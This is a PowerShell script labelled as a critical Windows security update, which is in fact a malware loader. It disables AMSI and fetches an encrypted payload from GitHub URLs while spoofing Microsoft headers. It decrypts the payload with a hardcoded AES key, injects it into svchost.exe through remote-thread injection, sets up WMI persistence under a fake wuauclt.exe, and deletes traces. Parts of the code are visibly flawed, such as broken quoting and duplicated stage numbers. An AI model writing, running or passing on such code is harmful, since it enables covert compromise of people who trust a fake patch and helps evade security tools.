<# 
Windows Security Update KB5025885 - Critical Patch
#>

# Stage 1: Environment Preparation
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Stage 2: AES Decryption Stub
function Decrypt-AESPayload {
    param(
        [byte[]]$EncryptedData,
        [string]$Key = "155caff636d4fbafbea4d7f8bc5fa5245d39afddc5105925e54a79cd616d4ed6",
        [string]$IV = "4649ad052d3300b78b3a0bfb5936b6a9"
    )
    
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [Convert]::FromHexString($Key)
    $aes.IV = [Convert]::FromHexString($IV)
    
    $decryptor = $aes.CreateDecryptor()
    $ms = New-Object System.IO.MemoryStream
    $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    
    $cs.Write($EncryptedData, 0, $EncryptedData.Length)
    $cs.FlushFinalBlock()
    $ms.ToArray()
}

# Stage 3: Secure Download
try {
    $cdnUrls = @(
        "https://raw.githubusercontent.com/hotthings7/Clipord-Update/main/releases/winupdate.bin",
        "https://gist.githubusercontent.com/hotthings7/raw/legit_update"
    )
    
    $encryptedData = [Convert]::FromBase64String(
        (Invoke-WebRequest -Uri $cdnUrls[$(Get-Random -Maximum $cdnUrls.Count)] -UseBasicParsing -Headers @{
            'Referer' = 'https://support.microsoft.com'
            'User-Agent' = 'Microsoft-Delivery-Optimization/10.0'
        }).Content
    )
    
    $decryptedBytes = Decrypt-AESPayload -EncryptedData $encryptedData
} catch { exit }

# Stage 4: Memory Injection
$hProcess = Start-Process 'C:\Windows\System32\svchost.exe' -PassThru
$hProcess.WaitForInputIdle()

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class MemOps {
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

$memAddr = [MemOps]::VirtualAllocEx($hProcess.Handle, [IntPtr]::Zero, [uint]$decryptedBytes.Length, 0x3000, 0x40)
[MemOps]::WriteProcessMemory($hProcess.Handle, $memAddr, $decryptedBytes, [uint]$decryptedBytes.Length, [out][UIntPtr]::Zero) | Out-Null
[MemOps]::CreateRemoteThread($hProcess.Handle, [IntPtr]::Zero, 0, $memAddr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null  
# Stage 4: Persistence via WMI Subscription
$installPath = "$env:APPDATA\Microsoft\Network\wuauclt.exe"
[IO.File]::WriteAllBytes($installPath, $decryptedBytes)

$filterArgs = @{
    Name = 'SecurityScanFilter'
    EventNameSpace = 'root\subscription'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
    QueryLanguage = 'WQL'
}

$consumerArgs = @{
    Name = 'SecurityScanConsumer'
    CommandLineTemplate = ""$installPath""
    RunInteractively = $false
}

New-CimInstance -ClassName __EventFilter -Namespace root\subscription -Property $filterArgs | Out-Null
New-CimInstance -ClassName CommandLineEventConsumer -Namespace root\subscription -Property $consumerArgs | Out-Null

# Stage 5: Cleanup & Anti-Forensics
Remove-Item $installPath -Force -ErrorAction SilentlyContinue
[System.GC]::Collect()
